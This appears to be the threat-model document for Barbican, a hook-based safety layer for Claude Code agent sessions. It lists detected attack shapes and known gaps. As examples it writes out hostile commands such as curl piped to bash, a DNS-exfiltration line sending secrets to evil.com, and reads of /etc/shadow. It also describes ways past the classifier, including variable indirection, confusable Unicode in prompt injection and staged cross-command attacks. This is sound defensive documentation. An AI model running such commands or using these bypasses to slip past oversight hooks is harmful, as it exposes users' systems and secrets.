# Barbican threat model

Barbican sits on the `PreToolUse` / `PostToolUse` hook boundary of Claude Code and exposes an MCP server at `~/.claude/barbican/barbican mcp-serve`. A bug in Barbican is a bug in the safety floor of the user's entire Claude Code session — treat every finding that way.

This document enumerates what Barbican tries to defend against, what it explicitly does not defend against, the known parser limits, and the configuration knobs.

## In scope — Barbican's job

- **Bash composition attacks** detected pre-execution:
  - `curl | <shell>` / `wget | <shell>` including absolute-path variants (audit H1).
  - Base64 / xxd / openssl pipelines writing to an execution target (audit H2).
  - Re-entry wrappers that hide inner commands (`find -exec`, `xargs`, `sudo`, `timeout`, `nohup`, `env`, `watch`, `nice`, `parallel`, `su -c`, `doas`, `runuser`, `setsid`, `stdbuf`, `unbuffer`) (audit M1).
  - DNS-channel exfil (`dig`, `host`, `nslookup`, `drill`, `resolvectl`) (audit M2).
- **Prompt-injection patterns** in PostToolUse tool output, with Unicode awareness:
  - NFKC normalization before matching (fullwidth Latin, mathematical alphanumerics, compatibility ligatures) (audit M3).
  - Zero-width + bidi-override + isolate stripping (`U+200B`/`200C`/`200D`/`FEFF`, `U+202A..202E`, `U+2066..2069`) (audit M3).
  - Payload scan default cap 5 MB (configurable) with explicit truncation warning in the audit log (audit M3).
- **SSRF hardening** in `safe_fetch`:
  - Reject hostnames resolving to RFC1918, loopback, link-local, CGNAT (100.64/10), IMDS (169.254.169.254, fd00:ec2::254).
  - Reject raw IP literals unless `BARBICAN_ALLOW_IP_LITERALS=1`.
  - DNS-pin: resolve once, connect by IP, send original Host header (defeats DNS rebinding) (audit M4).
- **`safe_read` sensitive-path denial** by default (opt-out `BARBICAN_SAFE_READ_ALLOW_SENSITIVE=1`) (audit L3).
- **Audit log hygiene**: ANSI escapes stripped (L1), files created with mode `0o600` (L2).
- **Wrapper binaries** (1.4.0+): `barbican-shell`, `barbican-python`, `barbican-node`, `barbican-ruby`, `barbican-perl`. Classifier-gated drop-ins for `bash -c` / `python3 -c` / `node -e` / `ruby -e` / `perl -e`. Every invocation runs the same `pre_bash::classify_command` rules the hook uses *before* spawning the interpreter; on allow, stdout/stderr stream through the secret-token redactor (`sk-ant-…`, `ghp_…`, `glpat-…`, `AKIA…`, `xox[abprs]-…`, `ATATT3x…`, `eyJ…`) and one JSONL audit record lands in `~/.claude/barbican/audit.log` with the body's sha256 (never the body text). Signal-kill of the child propagates as `128 + signal` per shell convention.

## Out of scope — explicit non-goals

Barbican does not defend against these classes; the user's operating environment or Claude Code itself must.

- **The underlying model being asked to produce malicious code that Barbican's parser can't classify.** If `tree-sitter-bash` cannot parse a construct, Barbican denies it (deny-by-default rule). We do not attempt to outsmart adversarial bash grammars.
- **Kernel / hypervisor exploits, TOCTOU against the filesystem.** Barbican runs as the same user as Claude Code with no privilege boundary. In particular, `safe_read` canonicalizes + policy-checks before calling `File::open`; a concurrent attacker who swaps a path component between the check and the open can defeat the policy. Our defense is to canonicalize through symlinks at both check time and read time; we do not attempt `open(O_NOFOLLOW) + fstat` re-verification.
- **Hardlinks to deny-listed targets.** `safe_read` blocks by canonical path; hardlinks share an inode and cannot be distinguished from the original file through path-based policy. If an attacker can create a hardlink from an allowed path to `/etc/shadow` on the same filesystem, they can exfiltrate it. Defense-in-depth here belongs to filesystem permissions.
- **Claude Code itself being compromised.** A modified Claude Code binary can bypass its own hooks.
- **The user granting Claude Code broad permissions outside of Barbican's scope** (e.g. enabling arbitrary MCP servers with no safety layer).
- **Prompt injection via attachments Claude Code hasn't yet rendered through a hook** (e.g. a PDF read directly by the model without triggering a PostToolUse hook we observe).
- **Confusables outside NFKC.** Specifically: Cyrillic `і` (U+0456) is NFKC-distinct from Latin `i` (U+0069). Catching Cyrillic-vs-Latin homoglyph attacks requires a dedicated confusables normalization pass, which is future work. A test in `sanitize.rs` documents this limit.
- **Process-level side channels** (timing, thermal, power) and network-level traffic analysis.
- **Untrusted-launch environment.** An attacker who controls the Barbican process's environment at launch (e.g. a hostile `.envrc` the user direnv-allowed, a compromised parent shell, a malicious Claude Code replacement) can set `BARBICAN_SAFE_READ_ALLOW_SENSITIVE=1`, `BARBICAN_SAFE_READ_ALLOW=/absolute/secret`, `BARBICAN_ALLOW_IP_LITERALS=1`, `BARBICAN_ALLOW_MALFORMED_HOOK_JSON=1`, or set `HOME` to relocate the deny-list base and the audit log. **A HOME-empty / HOME-unset context (common in minimal cron, `systemd-run`, non-interactive sudo) similarly degrades `safe_read`: `home_dir()` falls back to `/`, the home-relative prefixes (`.ssh/`, `.aws/`, `.config/gh/`, …) become unreachable as policy rules, and the ancestor-symlink anti-laundering walk is disabled. Run Barbican with HOME set; otherwise only the absolute-path deny rules (`/etc/shadow`, `.env` by-name) apply. Documented in 1.3.7 adversarial review (Claude WARNING #5).** All of these are documented opt-outs — by the time the attacker has this foothold, they can also set `PATH`, `LD_PRELOAD`, or replace the Barbican binary outright. Barbican does not attempt to outrun a hostile launcher; defense-in-depth here belongs to the user's trust in their shell startup.
- **Stateful cross-command attacks.** Barbican sees one bash command at a time through the `PreToolUse` hook. It cannot track shell state that persists between invocations — `cwd`, exported shell variables, aliases. Shapes like `cd /tmp/evil-planted-gitrepo && git log` route git onto an attacker-planted `.git/config` without any single command being dangerous in isolation (the `cd` is benign; the `git log` is benign; only the sequence is harmful). Closing this class would require a Claude Code extension that surfaces transcript-level state to the hook. Until then, the single-command classifier family covers:
  - Argv-side git config pivots: `git -C`, `--git-dir=`, `--work-tree=`, `-c core.X=`.
  - Env-var git config pivots: `GIT_DIR=`, `GIT_SSH_COMMAND=`, `GIT_PAGER=`, `GIT_EDITOR=`, `GIT_ASKPASS=`, `GIT_EXTERNAL_DIFF=`, `GIT_PROXY_COMMAND=` as argv-prefix assignments (8th-pass).
- **Non-GNU `tar` / `getopt_long` abbreviation quirks.** The `tar_command_exec` classifier's prefix-abbreviation support (`--to-com=`, `--checkpoint-ac=exec=`) is tuned for GNU `tar`'s documented semantics. BSD `tar`, mock implementations, or non-standard option parsers that accept different abbreviation rules may accept forms the classifier doesn't match. The user's tar implementation is assumed to be GNU-compatible.
- **Container-CLI subcommand grammars.** `docker run`, `podman run`, `buildah run`, `kubectl exec`, etc. are handled by scanning argv for a trailing `<shell> -c CODE`. Subcommand-specific argv grammars (e.g. `docker compose exec SERVICE CMD` variants) are not parsed precisely; the classifier may under-flag when the inner shell is obscured by a non-bash/sh launcher inside the container.
- **Ancestor symlinks above `$HOME`.** `safe_read`'s `path_contains_symlink` anti-laundering walk stops at `$HOME`. Platform fixtures like macOS `/var → /private/var` or `/tmp → /private/tmp` are intentionally exempt — they're system-level and not attacker-plantable under the threat model. System-wide compromises that create ancestor symlinks above `$HOME` are out of scope.
- **Fully-interpreted obfuscation in scripting-lang inline code.** `scripting_lang_shellout` detects hex `\x`, unicode `\u00`, octal `\OOO`, and named-unicode `\N{…}` escape ladders plus string concatenation across common concat operators. It does not decode escapes at classification time; an attacker with a more elaborate encoding scheme (double-base64, XOR, custom RC4) defeats the obfuscation-marker heuristic. Fuzzing in 1.3.0 will explore this surface.
- **`safe_fetch` DNS reachability side channel** — shipped in 1.2.1. Every DNS / IP / scheme classification now surfaces the identical opaque user-visible message (`target cannot be fetched`); richer detail stays in the local audit log. Pinned by `render_error_is_opaque_across_dns_ip_and_scheme_variants` in `safe_fetch.rs` and `user_visible_error_is_identical_across_nxdomain_rfc1918_and_loopback` in the integration tests.
- **Wrapper interpreter resolution trusts `$PATH`.** If `$BARBICAN_SHELL` / `$BARBICAN_PYTHON` / `$BARBICAN_NODE` / `$BARBICAN_RUBY` / `$BARBICAN_PERL` is unset, the wrapper invokes `bash` / `python3` / `node` / `ruby` / `perl` via `std::process::Command::new`, which resolves through the inherited `$PATH`. A caller that controls `$PATH` at invocation time can point the wrapper at any executable. This is the same trust boundary every CLI tool has; closing it would require baking absolute interpreter paths into the installed wrapper at install time, which conflicts with the "drop-in for the interpreter on your `$PATH`" use case. Set the env-var override (which IS required to be an absolute path, 1.4.0 crew review WARNING-4) if this matters in your environment. Documented as known out-of-scope in 1.4.0 crew review (Claude WARNING-4).
- **Wrapper runtime-dynamic constructs.** The 1.4.0 wrapper binaries run the same static classifier the `PreToolUse` hook uses. Runtime-dynamic shapes — shell variable indirection (`CURL=curl; $CURL …`), `eval "$var"`, `exec`-to-another-shell, dynamically-constructed argv via `sh -c "$(…)"` — still execute inside the child interpreter and are only caught to the extent the classifier catches them statically. Wrappers are a classifier front-end, not a sandbox.
- **Wrapper output redaction is line-scoped.** The secret-token redactor matches prefix-anchored patterns (`sk-ant-`, `ghp_`, `glpat-`, `AKIA`, `xox[abprs]-`, `ATATT3x`, `eyJ…`) per line. A token split across a newline — e.g. child writes `sk-ant-api03-\n…body…` through `printf '%s\n%s\n'` with a mid-token break — is not redacted. Real secrets don't wrap lines in practice; adversarial constructions that deliberately fold a secret across lines are out of scope. Generic-entropy detection (AWS secret access key, bare base64 blobs) is not implemented because the false-positive rate on git SHAs / UUIDs is too high for a safety tool.
- **`safe_fetch` Cloudflare DNS fallback in hermetic environments.** `ProductionResolver::new` reads `/etc/resolv.conf` via hickory's `builder_tokio()`. If that fails (hermetic sandboxes, stripped containers, CI runners without resolv mounted), it falls back to Cloudflare UDP/TCP (`1.1.1.1` / `1.0.0.1`). This means a hostname that would never have resolved in the user's real DNS environment *can* resolve on Cloudflare, and a hostname the user's corporate DNS would block *can* resolve publicly. The SSRF filter still rejects private-range results, so the resolved IP is still policy-checked — but the fact that a query leaves the sandbox at all is itself a privacy / data-egress surface the user may not have expected. If the user's environment MUST stay air-gapped from public DNS, run Barbican behind an explicit network policy (firewall, netns) rather than relying on the hermetic resolv; there is no env-var switch to disable the fallback today.

## Known parser limits

Cases where `tree-sitter-bash` or our wrapper can't classify an expression with confidence, and the Barbican response. Deny-by-default applies to all of these unless explicitly noted; per-phase tests pin the current behavior so later work can't regress it.

### Parser-level (hard-deny)

Every input the parser rejects collapses to `ParseError::Malformed` and the hook exits with the Claude Code block code. The walker rejects:

- **Unclean tree-sitter parse** — unterminated quotes, unmatched parens, truncated heredocs. `tree.root_node().has_error()` is the signal.
- **Unrepresentable pipeline stages** — any stage that isn't a bare `command` or `redirected_statement{command}`. In particular `curl … | (bash)`, `curl … | { bash; }`, `curl … | if true; then bash; fi` are all rejected, because the wrapping construct hides the inner sink from classifiers.
- **Compound/subshell/control-flow body carrying a trailing redirect** — `{ cat /etc/shadow; } > /tmp/x.sh`, `( cmd ) > /tmp/x`. The redirect cannot be safely attributed to any one inner command, and the shape is the H2 attack surface.
- **Invalid UTF-8 byte boundaries inside a node range** — defensive; `&str` input guarantees UTF-8 at the buffer level but a grammar bug producing a non-boundary range would otherwise silently drop bytes.
- **Recursion deeper than `MAX_DEPTH = 100`** — defense-in-depth against stack-overflow DoS from nested `$(…)`.

### Classifier-level (documented limits by phase)

These inputs parse cleanly but are outside the scope of the phase that shipped the current classifier. Later phases close them; tests pin the current behavior.

- **H1 network-tool scope is `curl`/`wget` only.** Per Narthex parity, the H1 pipeline classifier denies only `curl`/`wget` piped to a shell interpreter. Other egress channels in `NETWORK_TOOLS_HARD` (`nc`, `ncat`, `socat`, `ssh`, `dig`, `host`, `nslookup`, `drill`, `resolvectl`) are not H1's job — they are the M2 classifier's responsibility (Phase 5), where DNS-exfil composition (`cat secret | dig {}.evil.com`) is detected. Pinned by `nc_pipe_bash_allows_h1_is_curl_wget_only` and siblings.
- **Variable indirection on `argv[0]`** — e.g. `CURL=/usr/bin/curl; $CURL https://x | bash`. The parser surfaces `$CURL` as the basename, not `curl`, so the H1 classifier doesn't match. Requires variable tracking which Phase 2 does not ship. Pinned by `variable_indirection_allows_phase2_does_not_resolve_vars`.
- **Staged writes without a pipeline** — `wget -O /tmp/s.sh; bash /tmp/s.sh`. Phase 2 H1 only classifies within-pipeline shapes; the cross-command staging pattern is Phase 3 H2. Pinned by `two_pipelines_curl_then_bash_allows_h1_is_per_pipeline`.
- **`bash -c "$(curl …)"`** — the substitution contains a bare `curl` with no `|bash` inside, so H1's within-pipeline rule doesn't fire. The re-entry wrapper classifier in Phase 4 M1 will catch this by gating `bash -c <sub>` on the sub's contents. Pinned by `bash_dash_c_curl_substitution_allows_for_now_phase4_m1`.
- **Cyrillic confusables in PostToolUse scan** — NFKC normalization is applied, but NFKC does not map Cyrillic `і` (U+0456) to Latin `i`. A dedicated confusables pass would catch this class; not yet shipped. Pinned by `nfkc_does_not_map_cyrillic_i`.
- **Heredoc body capture** — the IR captures the heredoc delimiter (with surrounding quoting) so classifiers can distinguish quoted from unquoted forms. The body itself is not yet surfaced to classifiers; a later phase will if H2/M1 need it.

## Configuration

All knobs are environment variables read at process start; none are persistent on disk.

| Variable | Default | Meaning |
|---|---|---|
| `BARBICAN_LOG` | `warn` | `tracing` env-filter for stderr logs. |
| `BARBICAN_SCAN_MAX_BYTES` | `5242880` (5 MB) | Max bytes scanned for injection patterns; larger inputs emit a `scan-truncated` warning. (M3) |
| `BARBICAN_GIT_HARD_DENY` | `0` | If `1`, promote `git` from ask-list to hard network-tools deny. |
| `BARBICAN_ALLOW_IP_LITERALS` | `0` | If `1`, `safe_fetch` accepts raw IP literals (still subject to SSRF filter). (M4) |
| `BARBICAN_SAFE_READ_ALLOW_SENSITIVE` | `0` | If `1`, `safe_read` permits reads under `~/.ssh/`, `~/.aws/`, etc. (L3) |
| `BARBICAN_SAFE_READ_EXTRA_DENY` | _(empty)_ | Colon-separated path prefixes to add to the sensitive list. |
| `BARBICAN_SAFE_READ_ALLOW` | _(empty)_ | Colon-separated paths to carve exact-match holes in the deny list. |
| `BARBICAN_SAFE_READ_MAX_BYTES` | `1048576` (1 MiB) | Default `safe_read` cap. Callers can override per-call; clamped to 10 MiB. |

The rule for new knobs: **strict default, named opt-out, documented here**. Never silently weaken a check; if a real false positive surfaces, add a knob.

## Risks of adoption

Installing Barbican is not strictly additive over running Claude Code with no hook at all. This section enumerates the ways Barbican could, in principle, make a user *worse off* than their no-hook baseline. These are not known exploitable bugs — they are attack surface the user opts into by installing Barbican, and bug classes that would be critical if discovered.

If you are deciding whether to recommend Barbican to someone, read this section first.

### New attack surface introduced by installing

- **The binary itself.** `barbican install` copies the release binary to `~/.claude/barbican/`, writes settings, and registers an MCP server that runs on every Claude Code session. A compromised release (stolen maintainer credentials, a supply-chain attack in the Rust dependency tree, a CI build step that injects code) is persistent code execution in every session. We don't currently ship reproducible builds, nor do we sign releases with a key separate from GitHub's release automation. Recommend running `cargo audit` against the lockfile in a release and verifying SHA-256 checksums against the GitHub-published release notes before installing.
- **The MCP subprocess.** Barbican's `safe_fetch` / `safe_read` / `safe_inspect` tools run as the user for the duration of every Claude Code session. A bug in the `rmcp` crate's JSON-RPC parsing, in our MCP server's tool dispatch, or in the async runtime is an always-on vector. `cargo audit` catches advisories but not 0-days.
- **The hook boundary.** The `pre-bash` and `post-mcp` hook binaries are fed stdin by Claude Code. A malformed payload that trips a panic or stack overflow in our parser or serde_json has the same cost as a classifier bypass: Claude Code's fallback behavior on a crashed hook is implementation-defined.
- **Attacker-influenced file reads.** `safe_read` canonicalizes the caller-supplied path through `std::fs::canonicalize` before policy enforcement, and the canonicalize step itself walks symlinks. A path that tickles a kernel filesystem bug (e.g. a 100-level symlink chain, a procfs entry that blocks) is evaluated before the deny policy decides anything. When the path *does* pass policy, the body flows through the sanitizer's regex engine + NFKC normalization — both are attacker-influenced surface. The canonicalize-vs-open TOCTOU window is a separate concern documented in the "Out of scope" section above.

### Trust inversion

- **Opt-out env vars as footguns.** `BARBICAN_ALLOW_MALFORMED_HOOK_JSON=1`, `BARBICAN_SAFE_READ_ALLOW_SENSITIVE=1`, `BARBICAN_ALLOW_IP_LITERALS=1`, `BARBICAN_SAFE_READ_ALLOW=/path`, `BARBICAN_SAFE_READ_EXTRA_DENY=/path`, `BARBICAN_GIT_HARD_DENY=0` — any of these in a compromised `.envrc`, a hostile parent shell, or a direnv-allowed directory flips Barbican into an allow-on-fail stance. The user thinks they have a safety layer; the attacker has already disabled it.
- **False sense of security.** The most dangerous outcome is "user installs Barbican, stops reviewing Claude Code's commands." Barbican's classifier catches *composition* patterns (`curl | bash` and its many disguises). It does NOT catch *semantically harmful but syntactically benign* commands: `rm -rf $HOME/project-i-care-about`, `git push --force`, `aws s3 rb s3://production`, `chmod 777 /etc`. All of those are parseable and allow-list-ed. Users who substitute Barbican for diligent review are worse off.
- **Documented limits that users skip.** `SECURITY.md § Out of scope` enumerates what Barbican doesn't defend against (stateful cross-command attacks, confusables outside NFKC, container-subcommand grammars, fully-interpreted obfuscation in scripting-lang inline code). A user who reads only the README's catch-list and not the out-of-scope list overestimates coverage.

### Bugs whose existence would be critical

These are not known to exist. If any *do* exist and haven't been discovered, they would make Barbican users meaningfully worse off than no-hook users:

- **Fail-open on classifier panic.** If a future refactor wraps the classifier in `catch_unwind` and maps the caught panic to `Decision::Allow` (for "safety of Barbican, not safety of user"), that reverses the deny-by-default rule exactly when an attacker is tripping the panic. Audit: grep for `catch_unwind`, `unwrap_or(Allow)`, any panic boundary that resolves to allow rather than deny. Today there is no such path; we want to keep it that way.
- **Allow-on-parse-failure fast path.** CLAUDE.md rule #1 says parse failures deny. A future "performance" optimization that short-circuits with allow on a cheap heuristic before the real parser runs would be a full bypass. No such path exists today.
- **Wrong-answer parser IR.** Our test coverage asserts "the parser doesn't panic" and "classifiers deny these known shapes." It does NOT prove "the IR faithfully represents every input." A bug where a compound command's inner structure is misrepresented (e.g. an `exec` wrapper's inner command is dropped from the IR) would be a classification bypass — the classifier would apply its rules to an incomplete picture. Property-based fuzzing plus the continuous cargo-fuzz cron narrow this, but don't close it.
- **Prompt-injection classifier narrowing.** NFKC is applied; Cyrillic confusables are out-of-scope per the explicit `nfkc_does_not_map_cyrillic_i` pinning test. An attacker who crafts injections using codepoints outside the NFKC mapping gets through the classifier but the model still sees them. A user who trusts "no injection flagged" more than they would have trusted "I read the model's output" is worse off.
- **Classifier over-denial becomes a denial-of-service on the user's own work.** If a future change denies shapes users legitimately need and there's no documented escape, users disable Barbican entirely, and now every command runs unchecked. Mitigate by documenting every new deny in `CHANGELOG.md` with a minimal PoC the user can reproduce.

### What to watch for as a user

- Before installing: verify the release's SHA-256 against the GitHub release notes; read the `CHANGELOG.md` entry for the version you're installing.
- After installing: run `barbican --version` in your shell of record to confirm you're on the version you expected; check `~/.claude/settings.json` to see the actual hook command lines Barbican wired up.
- Weekly (if you're using it seriously): `barbican uninstall --dry-run` to confirm the uninstaller sees the expected artifacts (detects tampering); re-run install to catch drift from upstream changes.
- If you see a command Claude Code proposes and wonder whether Barbican caught it: try the same command with `barbican pre-bash` manually, reading the deny reason (if any) from stderr.

### How Barbican narrows these risks over time

- Every fuzz-found crash (like 1.3.1 #33) turns into a red-test-first regression guard.
- Every SECURITY.md section labeled "Out of scope" is a candidate for a future classifier; adversarial review rounds have moved items between these lists.
- The continuous fuzzing cron (1.3.2+) runs daily; any new crash lands as a workflow artifact within 24 hours.
- `cargo audit` runs on every PR; RustSec advisories on our transitive deps surface immediately.

None of this makes the risks go to zero. It makes them knowable.

## Known advisories we ignore (with rationale)

CI runs `cargo audit --deny warnings` with a narrow allowlist. Any entry here must include: advisory ID, advisory URL, why the vulnerable code is not reachable in Barbican, and what would invalidate the ignore.

- **RUSTSEC-2026-0118** (`hickory-proto 0.26.1`) — NSEC3 closest-encloser proof validation enters an unbounded loop on cross-zone responses. The vulnerable code lives in hickory-proto's DNSSEC validation path. Barbican pulls hickory-resolver with `default-features = false` and only enables `system-config` + `tokio`; no `dnssec-*` feature is enabled, so the NSEC3 validator is never compiled in. Advisory: https://github.com/hickory-dns/hickory-dns/security/advisories/GHSA-3v94-mw7p-v465. **Invalidates the ignore:** enabling any DNSSEC feature on hickory-resolver, or a future hickory-proto release that enables the affected code unconditionally — at which point the ignore must be dropped and the dep upgraded.

## Reporting security issues

- Private report: open a [security advisory on GitHub](https://github.com/jdidion/barbican/security/advisories/new).
- If that is not available, email the maintainer (address in `Cargo.toml` / GitHub profile).
- Please include a minimal reproduction (the exact JSON fed to `barbican pre-bash` / `post-mcp` / etc.) and the Barbican version (`barbican --version`).
